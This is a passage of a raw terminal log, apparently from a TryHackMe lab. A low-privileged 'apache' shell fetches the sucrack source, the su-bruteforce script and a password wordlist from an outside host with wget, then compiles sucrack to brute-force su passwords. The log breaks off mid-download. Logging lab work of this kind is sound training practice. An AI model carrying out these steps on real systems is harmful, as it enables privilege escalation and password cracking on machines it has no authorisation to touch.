+Length: 2496 (2.4K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/stat.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.44K  --.-KB/s    in 0.001s  
+
+2025-03-19 23:52:49 (3.35 MB/s) - ‘10.8.61.245/sucrack/src/stat.h’ saved [2496/2496]
+
+--2025-03-19 23:52:49--  http://10.8.61.245/sucrack/src/su.c
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5890 (5.8K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/su.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   5.75K  --.-KB/s    in 0.005s  
+
+2025-03-19 23:52:50 (1.17 MB/s) - ‘10.8.61.245/sucrack/src/su.c’ saved [5890/5890]
+
+--2025-03-19 23:52:50--  http://10.8.61.245/sucrack/src/su.h
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 2418 (2.4K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/su.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.36K  --.-KB/s    in 0.002s  
+
+2025-03-19 23:52:50 (1.35 MB/s) - ‘10.8.61.245/sucrack/src/su.h’ saved [2418/2418]
+
+--2025-03-19 23:52:50--  http://10.8.61.245/sucrack/src/sucrack.c
+Reusing existing connection to 10.8.61.245:80.
+HTTP request sent, awaiting response... No data received.
+Retrying.
+
+[K--2025-03-19 23:52:51--  (try: 2)  http://10.8.61.245/sucrack/src/sucrack.c
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 9060 (8.8K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/sucrack.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   8.85K  --.-KB/s    in 0.03s   
+
+2025-03-19 23:52:52 (343 KB/s) - ‘10.8.61.245/sucrack/src/sucrack.c’ saved [9060/9060]
+
+--2025-03-19 23:52:52--  http://10.8.61.245/sucrack/src/sucrack.h
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 1626 (1.6K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/sucrack.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   1.59K  --.-KB/s    in 0s      
+
+2025-03-19 23:52:52 (4.27 MB/s) - ‘10.8.61.245/sucrack/src/sucrack.h’ saved [1626/1626]
+
+--2025-03-19 23:52:52--  http://10.8.61.245/sucrack/src/util.c
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 2201 (2.1K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/util.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.15K  --.-KB/s    in 0.001s  
+
+2025-03-19 23:52:53 (1.99 MB/s) - ‘10.8.61.245/sucrack/src/util.c’ saved [2201/2201]
+
+--2025-03-19 23:52:53--  http://10.8.61.245/sucrack/src/util.h
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2414 (2.4K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/util.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.36K  --.-KB/s    in 0.002s  
+
+2025-03-19 23:52:53 (1.41 MB/s) - ‘10.8.61.245/sucrack/src/util.h’ saved [2414/2414]
+
+--2025-03-19 23:52:53--  http://10.8.61.245/sucrack/src/worker.c
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 4726 (4.6K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/worker.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   4.62K  --.-KB/s    in 0.01s   
+
+2025-03-19 23:52:54 (371 KB/s) - ‘10.8.61.245/sucrack/src/worker.c’ saved [4726/4726]
+
+--2025-03-19 23:52:54--  http://10.8.61.245/sucrack/src/worker.h
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 2116 (2.1K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/worker.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.07K  --.-KB/s    in 0.003s  
+
+2025-03-19 23:52:55 (772 KB/s) - ‘10.8.61.245/sucrack/src/worker.h’ saved [2116/2116]
+
+FINISHED --2025-03-19 23:52:55--
+Total wall clock time: 32s
+Downloaded: 41 files, 513K in 3.8s (135 KB/s)
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K10.8.61.245
+_MEIOeFYgo
+mysql.sock
+mysql.sock.lock
+snap-private-tmp
+systemd-private-9de3f281cfe246a4a678df13478b7ade-ModemManager.service-jsAH0e
+systemd-private-9de3f281cfe246a4a678df13478b7ade-switcheroo-control.service-oBfb4f
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-logind.service-2P5nXe
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-resolved.service-co2Vgj
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-timesyncd.service-UdhuKi
+systemd-private-9de3f281cfe246a4a678df13478b7ade-upower.service-G1XbMf
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ cd sucracl[Kk[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd sucrack
+[Kcd sucrack
+bash: cd: sucrack: No such file or directory
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K10.8.61.245
+_MEIOeFYgo
+mysql.sock
+mysql.sock.lock
+snap-private-tmp
+systemd-private-9de3f281cfe246a4a678df13478b7ade-ModemManager.service-jsAH0e
+systemd-private-9de3f281cfe246a4a678df13478b7ade-switcheroo-control.service-oBfb4f
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-logind.service-2P5nXe
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-resolved.service-co2Vgj
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-timesyncd.service-UdhuKi
+systemd-private-9de3f281cfe246a4a678df13478b7ade-upower.service-G1XbMf
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ cd 10    [K.9[K8.61.245[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd 10.8.61.245
+[Kcd 10.8.61.245
+apache@tryhackme:/tmp/10.8.61.245$ [Kapache@tryhackme:/tmp/10.8.61.245$ [K[?2004hapache@tryhackme:/tmp/10.8.61.245$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+sucrack
+apache@tryhackme:/tmp/10.8.61.245$ [Kapache@tryhackme:/tmp/10.8.61.245$ [K[?2004hapache@tryhackme:/tmp/10.8.61.245$ cd suc[K[K[K[K[K[Kmv -v sucrack ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmv -v sucrack ..
+[Kmv -v sucrack ..
+[Krenamed 'sucrack' -> '../sucrack'
+apache@tryhackme:/tmp/10.8.61.245$ [Kapache@tryhackme:/tmp/10.8.61.245$ [K[?2004hapache@tryhackme:/tmp/10.8.61.245$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+[Kapache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K10.8.61.245
+_MEIfyiUAV
+mysql.sock
+mysql.sock.lock
+snap-private-tmp
+sucrack
+systemd-private-9de3f281cfe246a4a678df13478b7ade-ModemManager.service-jsAH0e
+systemd-private-9de3f281cfe246a4a678df13478b7ade-switcheroo-control.service-oBfb4f
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-logind.service-2P5nXe
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-resolved.service-co2Vgj
+systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-timesyncd.service-UdhuKi
+systemd-private-9de3f281cfe246a4a678df13478b7ade-upower.service-G1XbMf
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ rm -r 10.8.61.245[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm -r 10.8.61.245
+[Krm -r 10.8.61.245
+[Kapache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ cd sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd sucrack
+[Kcd sucrack
+[Kapache@tryhackme:/tmp/sucrack$ [Kapache@tryhackme:/tmp/sucrack$ [K[?2004hapache@tryhackme:/tmp/sucrack$ ./configure[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./configure
+[K./configure
+[Kbash: ./configure: Permission denied
+apache@tryhackme:/tmp/sucrack$ [Kapache@tryhackme:/tmp/sucrack$ [K[?2004hapache@tryhackme:/tmp/sucrack$ chmod +x configure[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x configure
+[Kchmod +x configure
+[Kapache@tryhackme:/tmp/sucrack$ [Kapache@tryhackme:/tmp/sucrack$ [K[?2004hapache@tryhackme:/tmp/sucrack$ ./confiug[K[Kgure[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./configure
+[K./configure
+[Kchecking for a BSD-compatible install... /usr/bin/install -c
+checking whether build environment is sane... yes
+checking for a thread-safe mkdir -p... /usr/bin/mkdir -p
+checking for gawk... gawk
+checking whether make sets $(MAKE)... yes
+checking whether make supports nested variables... yes
+checking build system type... [Kchecking build system type... [Kchecking build system type... x86_64-pc-linux-gnu
+[Kchecking host system type... x86_64-pc-linux-gnu
+checking target system type... x86_64-pc-linux-gnu
+checking for gcc... gcc
+checking whether the C compiler works... [Kchecking whether the C compiler works... [Kchecking whether the C compiler works... yes
+checking for C compiler default output file name... a.out
+checking for suffix of executables... 
+checking whether we are cross compiling... [Kchecking whether we are cross compiling... [Kchecking whether we are cross compiling... no
+checking for suffix of object files... o
+checking whether we are using the GNU C compiler... yes
+checking whether gcc accepts -g... yes
+checking for gcc option to accept ISO C89... none needed
+checking whether gcc understands -c and -o together... [Kchecking whether gcc understands -c and -o together... [Kchecking whether gcc understands -c and -o together... yes
+checking for style of include used by make... GNU
+checking dependency style of gcc... gcc3
+checking how to run the C preprocessor... gcc -E
+checking for grep that handles long lines and -e... /usr/bin/grep
+checking for egrep... /usr/bin/grep -E
+checking for ANSI C header files... [Kchecking for ANSI C header files... [Kchecking for ANSI C header files... yes
+checking for sys/wait.h that is POSIX.1 compatible... yes
+checking for sys/types.h... [Kchecking for sys/types.h... [Kchecking for sys/types.h... yes
+checking for sys/stat.h... yes
+checking for stdlib.h... yes
+checking for string.h... yes
+checking for memory.h... yes
+checking for strings.h... [Kchecking for strings.h... [Kchecking for strings.h... yes
+checking for inttypes.h... yes
+checking for stdint.h... yes
+checking for unistd.h... yes
+checking fcntl.h usability... yes
+checking fcntl.h presence... yes
+checking for fcntl.h... yes
+[Kchecking for stdlib.h... (cached) yes
+checking for string.h... (cached) yes
+checking sys/ioctl.h usability... yes
+checking sys/ioctl.h presence... yes
+checking for sys/ioctl.h... yes
+checking for unistd.h... (cached) yes
+checking pthread.h usability... [Kchecking pthread.h usability... [Kchecking pthread.h usability... yes
+checking pthread.h presence... yes
+checking for pthread.h... yes
+checking for an ANSI C-conforming const... yes
+checking whether struct tm is in sys/time.h or time.h... time.h
+checking whether gcc needs -traditional... no
+checking for stdlib.h... (cached) yes
+checking for GNU libc compatible malloc... yes
+checking for stdlib.h... (cached) yes
+checking for GNU libc compatible realloc... [Kchecking for GNU libc compatible realloc... [Kchecking for GNU libc compatible realloc... yes
+checking for pid_t... yes
+checking vfork.h usability... no
+checking vfork.h presence... no
+checking for vfork.h... no
+checking for fork... yes
+checking for vfork... [Kchecking for vfork... [Kchecking for vfork... yes
+checking for working fork... yes
+checking for working vfork... (cached) yes
+checking for dup2... yes
+checking for memset... yes
+checking for strdup... [Kchecking for strdup... [Kchecking for strdup... yes
+checking for strstr... yes
+checking that generated files are newer than configure... done
+configure: creating ./config.status
+config.status: creating Makefile
+config.status: creating src/Makefile
+[Kconfig.status: creating config.h
+config.status: executing depfiles commands
+
+sucrack configuration
+---------------------
+sucrack version		: 1.2.3
+target system           : LINUX
+sucrack link flags      : -pthread
+sucrack compile flags	: -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\""
+
+apache@tryhackme:/tmp/sucrack$ [Kapache@tryhackme:/tmp/sucrack$ [K[?2004hapache@tryhackme:/tmp/sucrack$ make[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmake
+[Kmake
+[Kmake  all-recursive
+make[1]: Entering directory '/tmp/sucrack'
+Making all in src
+make[2]: Entering directory '/tmp/sucrack/src'
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-sucrack.o -MD -MP -MF .deps/sucrack-sucrack.Tpo -c -o sucrack-sucrack.o `test -f 'sucrack.c' || echo './'`sucrack.c
+In file included from sucrack.c:41:
+rules.h:59:20: warning: ‘rules_map’ defined but not used [-Wunused-variable]
+   59 | static rules_map_t rules_map[] = {
+      |                    ^~~~~~~~~
+mv -f .deps/sucrack-sucrack.Tpo .deps/sucrack-sucrack.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-worker.o -MD -MP -MF .deps/sucrack-worker.Tpo -c -o sucrack-worker.o `test -f 'worker.c' || echo './'`worker.c
+worker.c: In function ‘worker_run’:
+worker.c:152:9: warning: variable ‘rs’ set but not used [-Wunused-but-set-variable]
+  152 |     int rs;
+      |         ^~
+worker.c:151:13: warning: variable ‘then’ set but not used [-Wunused-but-set-variable]
+  151 |     clock_t then;
+      |             ^~~~
+mv -f .deps/sucrack-worker.Tpo .deps/sucrack-worker.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-dictionary.o -MD -MP -MF .deps/sucrack-dictionary.Tpo -c -o sucrack-dictionary.o `test -f 'dictionary.c' || echo './'`dictionary.c
+[Kdictionary.c: In function ‘dict_update_buffer_wait’:
+dictionary.c:340:13: warning: variable ‘then’ set but not used [-Wunused-but-set-variable]
+  340 |     clock_t then;
+      |             ^~~~
+mv -f .deps/sucrack-dictionary.Tpo .deps/sucrack-dictionary.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-pty.o -MD -MP -MF .deps/sucrack-pty.Tpo -c -o sucrack-pty.o `test -f 'pty.c' || echo './'`pty.c
+[Kmv -f .deps/sucrack-pty.Tpo .deps/sucrack-pty.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-su.o -MD -MP -MF .deps/sucrack-su.Tpo -c -o sucrack-su.o `test -f 'su.c' || echo './'`su.c
+su.c: In function ‘su_run’:
+su.c:109:13: warning: variable ‘then’ set but not used [-Wunused-but-set-variable]
+  109 |     clock_t then;
+      |             ^~~~
+mv -f .deps/sucrack-su.Tpo .deps/sucrack-su.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-rewriter.o -MD -MP -MF .deps/sucrack-rewriter.Tpo -c -o sucrack-rewriter.o `test -f 'rewriter.c' || echo './'`rewriter.c
+rewriter.c: In function ‘rewr_add_rules’:
+rewriter.c:55:9: warning: unused variable ‘s’ [-Wunused-variable]
+   55 |     int s;
+      |         ^
+rewriter.c: In function ‘rewr_get_rules’:
+rewriter.c:74:31: warning: implicit declaration of function ‘malloc’ [-Wimplicit-function-declaration]
+   74 |     rule_set = (rule_set_t *) malloc(sizeof(rule_set_t));
+      |                               ^~~~~~
+rewriter.c:74:31: warning: incompatible implicit declaration of built-in function ‘malloc’
+rewriter.c:34:1: note: include ‘<stdlib.h>’ or provide a declaration of ‘malloc’
+   33 | #include "rules.h"
+  +++ |+#include <stdlib.h>
+   34 | #include "stat.h"
+mv -f .deps/sucrack-rewriter.Tpo .deps/sucrack-rewriter.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-util.o -MD -MP -MF .deps/sucrack-util.Tpo -c -o sucrack-util.o `test -f 'util.c' || echo './'`util.c
+[Kmv -f .deps/sucrack-util.Tpo .deps/sucrack-util.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-stat.o -MD -MP -MF .deps/sucrack-stat.Tpo -c -o sucrack-stat.o `test -f 'stat.c' || echo './'`stat.c
+mv -f .deps/sucrack-stat.Tpo .deps/sucrack-stat.Po
+gcc -DHAVE_CONFIG_H -I. -I..    -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -MT sucrack-rules.o -MD -MP -MF .deps/sucrack-rules.Tpo -c -o sucrack-rules.o `test -f 'rules.c' || echo './'`rules.c
+rules.c: In function ‘rules_prepend_digit’:
+rules.c:117:5: warning: ignoring return value of ‘asprintf’, declared with attribute warn_unused_result [-Wunused-result]
+  117 |     asprintf(&out, "%i%s", *(int*) arg, in);
+      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+rules.c: In function ‘rules_append_digit’:
+rules.c:131:5: warning: ignoring return value of ‘asprintf’, declared with attribute warn_unused_result [-Wunused-result]
+  131 |     asprintf(&out, "%s%i", in, *(int*) arg);
+      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+In file included from rules.c:32:
+At top level:
+rules.h:59:20: warning: ‘rules_map’ defined but not used [-Wunused-variable]
+   59 | static rules_map_t rules_map[] = {
+      |                    ^~~~~~~~~
+mv -f .deps/sucrack-rules.Tpo .deps/sucrack-rules.Po
+gcc -Wall -O2 -D_GNU_SOURCE -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\"" -g -O2 -pthread  -o sucrack sucrack-sucrack.o sucrack-worker.o sucrack-dictionary.o sucrack-pty.o sucrack-su.o sucrack-rewriter.o sucrack-util.o sucrack-stat.o sucrack-rules.o  
+make[2]: Leaving directory '/tmp/sucrack/src'
+make[2]: Entering directory '/tmp/sucrack'
+make[2]: Leaving directory '/tmp/sucrack'
+make[1]: Leaving directory '/tmp/sucrack'
+apache@tryhackme:/tmp/sucrack$ [Kapache@tryhackme:/tmp/sucrack$ [K[?2004hapache@tryhackme:/tmp/sucrack$ a[Kmake install[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmake install
+[Kmake install
+[KMaking install in src
+make[1]: Entering directory '/tmp/sucrack/src'
+make[2]: Entering directory '/tmp/sucrack/src'
+make[2]: Nothing to be done for 'install-exec-am'.
+ /usr/bin/mkdir -p '/usr/local/bin'
+  /usr/bin/install -c sucrack '/usr/local/bin'
+/usr/bin/install: cannot create regular file '/usr/local/bin/sucrack': Permission denied
+make[2]: *** [Makefile:317: install-sucrackprgPROGRAMS] Error 1
+make[2]: Leaving directory '/tmp/sucrack/src'
+make[1]: *** [Makefile:615: install-am] Error 2
+make[1]: Leaving directory '/tmp/sucrack/src'
+make: *** [Makefile:445: install-recursive] Error 1
+apache@tryhackme:/tmp/sucrack$ [Kapache@tryhackme:/tmp/sucrack$ [K[?2004hapache@tryhackme:/tmp/sucrack$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[KCOPYING    Makefile.am	aclocal.m4    config.h.in    configure	   install-sh
+ChangeLog  Makefile.in	compile       config.log     configure.ac  missing
+INSTALL    README.md	config.guess  config.status  depcomp	   src
+Makefile   VERSION	config.h      config.sub     doc	   stamp-h1
+apache@tryhackme:/tmp/sucrack$ [Kapache@tryhackme:/tmp/sucrack$ [K[?2004hapache@tryhackme:/tmp/sucrack$ make install[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmake install
+[Kmake install
+[KMaking install in src
+make[1]: Entering directory '/tmp/sucrack/src'
+make[2]: Entering directory '/tmp/sucrack/src'
+make[2]: Nothing to be done for 'install-exec-am'.
+ /usr/bin/mkdir -p '/usr/local/bin'
+  /usr/bin/install -c sucrack '/usr/local/bin'
+/usr/bin/install: cannot create regular file '/usr/local/bin/sucrack': Permission denied
+make[2]: *** [Makefile:317: install-sucrackprgPROGRAMS] Error 1
+make[2]: Leaving directory '/tmp/sucrack/src'
+make[1]: *** [Makefile:615: install-am] Error 2
+make[1]: Leaving directory '/tmp/sucrack/src'
+make: *** [Makefile:445: install-recursive] Error 1
+apache@tryhackme:/tmp/sucrack$ [Kapache@tryhackme:/tmp/sucrack$ [K[?2004hapache@tryhackme:/tmp/sucrack$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+[Kapache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ wget -r http://10.8.61.245/[7msu-bruteforce[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mwget -r http://10.8.61.245/[27msu-bruteforce[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget -r http://10.8.61.245/su-bruteforce
+[Kwget -r http://10.8.61.245/su-bruteforce
+[K--2025-03-19 23:56:02--  http://10.8.61.245/su-bruteforce
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 301 Moved Permanently
+Location: /su-bruteforce/ [following]
+--2025-03-19 23:56:02--  http://10.8.61.245/su-bruteforce/
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 381 [text/html]
+Saving to: ‘10.8.61.245/su-bruteforce’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/su-brut 100%[===================>]     381  --.-KB/s    in 0s      
+
+2025-03-19 23:56:03 (28.5 MB/s) - ‘10.8.61.245/su-bruteforce’ saved [381/381]
+
+Loading robots.txt; please ignore errors.
+--2025-03-19 23:56:03--  http://10.8.61.245/robots.txt
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 404 File not found
+2025-03-19 23:56:03 ERROR 404: File not found.
+
+--2025-03-19 23:56:03--  http://10.8.61.245/su-bruteforce/.git/
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 650 [text/html]
+10.8.61.245/su-bruteforce/.git: Not a directory
+10.8.61.245/su-bruteforce/.git/index.html: Not a directory
+
+Cannot write to ‘10.8.61.245/su-bruteforce/.git/index.html’ (Not a directory).
+--2025-03-19 23:56:04--  http://10.8.61.245/su-bruteforce/README.md
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 925 [text/markdown]
+Saving to: ‘10.8.61.245/su-bruteforce/README.md’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/su-brut 100%[===================>]     925  --.-KB/s    in 0.001s  
+
+2025-03-19 23:56:05 (1.57 MB/s) - ‘10.8.61.245/su-bruteforce/README.md’ saved [925/925]
+
+--2025-03-19 23:56:05--  http://10.8.61.245/su-bruteforce/suBF.sh
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 2340 (2.3K) [text/x-sh]
+Saving to: ‘10.8.61.245/su-bruteforce/suBF.sh’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/su-brut 100%[===================>]   2.29K  --.-KB/s    in 0.03s   
+
+2025-03-19 23:56:05 (82.3 KB/s) - ‘10.8.61.245/su-bruteforce/suBF.sh’ saved [2340/2340]
+
+--2025-03-19 23:56:05--  http://10.8.61.245/su-bruteforce/top12000.txt
+Reusing existing connection to 10.8.61.245:80.
+HTTP request sent, awaiting response... No data received.
+Retrying.
+
+[K--2025-03-19 23:56:06--  (try: 2)  http://10.8.61.245/su-bruteforce/top12000.txt
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 100205 (98K) [text/plain]
+Saving to: ‘10.8.61.245/su-bruteforce/top12000.txt’
+
